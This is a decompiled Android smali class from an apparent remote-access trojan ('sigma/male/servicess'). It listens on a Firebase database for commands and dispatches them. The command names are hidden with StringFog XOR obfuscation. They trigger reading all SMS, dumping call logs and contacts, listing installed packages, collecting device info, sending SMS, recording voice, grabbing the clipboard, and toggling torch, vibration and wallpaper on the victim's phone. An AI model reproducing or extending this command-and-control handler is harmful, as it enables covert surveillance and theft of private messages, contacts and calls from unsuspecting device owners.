.class Lsigma/male/servicess$20;
.super Ljava/lang/Object;
.source "servicess.java"

# interfaces
.implements Lcom/google/firebase/database/ChildEventListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lsigma/male/servicess;->_service()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lsigma/male/servicess;


# direct methods
.method constructor <init>(Lsigma/male/servicess;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    .line 413
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onCancelled(Lcom/google/firebase/database/DatabaseError;)V
    .locals 0

    .prologue
    .line 492
    return-void
.end method

.method public onChildAdded(Lcom/google/firebase/database/DataSnapshot;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 415
    return-void
.end method

.method public onChildChanged(Lcom/google/firebase/database/DataSnapshot;Ljava/lang/String;)V
    .locals 4

    .prologue
    .line 420
    invoke-virtual {p1}, Lcom/google/firebase/database/DataSnapshot;->getValue()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/Map;

    .line 421
    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "NjkiQw=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lsigma/male/servicess;->access$4(Lsigma/male/servicess;Ljava/lang/String;)V

    .line 422
    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "NjkiWw=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Lsigma/male/servicess;->access$5(Lsigma/male/servicess;Ljava/lang/String;)V

    .line 423
    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "NjkiW1kn"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/Map;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Lsigma/male/servicess;->access$6(Lsigma/male/servicess;Ljava/lang/String;)V

    .line 424
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "NjA="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 425
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v3, ""

    invoke-virtual {v0, v1, v2, v3}, Lsigma/male/servicess;->_cd(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 482
    :cond_0
    :goto_0
    return-void

    .line 427
    :cond_1
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MTk2XlUm"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 428
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v1}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->getAllSms(Landroid/content/Context;)V

    goto :goto_0

    .line 430
    :cond_2
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MTk2Tlk5OA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 431
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v0}, Lsigma/male/servicess;->_dmpcal()V

    goto :goto_0

    .line 433
    :cond_3
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MTk2Tlc7IA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_4

    .line 434
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v0}, Lsigma/male/servicess;->_dmpcon()V

    goto :goto_0

    .line 436
    :cond_4
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MjEyXVk2PydKXSY="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 437
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v0}, Lsigma/male/servicess;->_getpackages()V

    goto :goto_0

    .line 439
    :cond_5
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "JjwjQVQ2OSI="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_6

    .line 440
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Lsigma/male/servicess;->_sudoapt(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 442
    :cond_6
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MTEwRFswPShLVw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_7

    .line 443
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v0}, Lsigma/male/servicess;->_devinfo()V

    goto/16 :goto_0

    .line 445
    :cond_7
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "ITsnXkwhMT5Z"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_8

    .line 446
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_showtoast(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 448
    :cond_8
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "ISA1SV0j"

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9

    .line 449
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_ttsdev(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 451
    :cond_9
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "Iz0kX1khMSJITg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_a

    .line 452
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_vibra(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 454
    :cond_a
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "JTgnVEs4ITVEWw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_b

    .line 455
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_palysmudic(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 457
    :cond_b
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "JjEoSUs4Jw=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_c

    .line 458
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v2}, Lsigma/male/servicess;->access$8(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lsigma/male/servicess;->_sendsm(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 460
    :cond_c
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "NjwnQ18wIydBVA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_d

    .line 461
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_changewall(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 463
    :cond_d
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "OiQxSFo="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_e

    .line 464
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    iget-object v1, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v1}, Lsigma/male/servicess;->access$0(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lsigma/male/servicess;->_voicere(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 466
    :cond_e
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "ITsoWQ=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_f

    .line 467
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v0}, Lsigma/male/servicess;->tont()V

    goto/16 :goto_0

    .line 469
    :cond_f
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "ITsgS0w="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_10

    .line 470
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v0}, Lsigma/male/servicess;->tofft()V

    goto/16 :goto_0

    .line 472
    :cond_10
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-static {v0}, Lsigma/male/servicess;->access$7(Lsigma/male/servicess;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "NjgvXQ=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 473
    iget-object v0, p0, Lsigma/male/servicess$20;->this$0:Lsigma/male/servicess;

    invoke-virtual {v0}, Lsigma/male/servicess;->clips()V

    goto/16 :goto_0
.end method

.method public onChildMoved(Lcom/google/firebase/database/DataSnapshot;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 489
    return-void
.end method

.method public onChildRemoved(Lcom/google/firebase/database/DataSnapshot;)V
    .locals 0

    .prologue
    .line 487
    return-void
.end method
